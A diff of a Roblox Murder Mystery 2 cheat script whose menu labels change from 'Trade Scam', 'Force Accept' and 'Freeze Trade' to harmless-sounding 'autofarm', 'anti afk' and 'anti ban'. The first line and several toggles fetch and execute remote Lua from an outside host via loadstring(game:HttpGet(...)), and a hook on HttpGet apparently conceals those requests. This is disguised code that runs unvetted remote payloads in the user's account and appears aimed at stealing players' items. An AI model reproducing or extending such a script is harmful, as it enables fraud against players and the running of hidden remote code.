@@ -1,28 +1,28 @@
 loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
-local Window = OrionLib:MakeWindow({Name = "🎃Mm2Scripter🎃", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Window = OrionLib:MakeWindow({Name = "Overdrive bypassed", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 local Tab = Window:MakeTab({
-    Name = "Main",
+    Name = "farming",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 Tab:AddButton({
-    Name = "Trade Scam✅",
+    Name = "autofarm script✅",
     Callback = function()
-loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
+loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()
               print("button pressed")
       end 
 })
 Tab:AddToggle({
-    Name = "✅Force Accept",
+    Name = "anti afk✅ (make sure to use one)",
     Default = false,
     Callback = function(Value)
         print(Value)
     end
 })
 Tab:AddToggle({
-    Name = "🧊Freeze Trade🧊",
+    Name = "anti ban",
     Default = false,
     Callback = function(Value)
 loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
@@ -30,7 +30,7 @@ loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", 
     end
 })
 local Tab = Window:MakeTab({
-    Name = "Dupe",
+    Name = "Server hop",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
     })
@@ -52,7 +52,7 @@ Tab:AddToggle({
     Default = false,
     Callback = function(Value)
         print(Value)
-loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()end
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()end
 })
 local httpHook;
 httpHook = hookfunction(game.HttpGet, function(self,...)
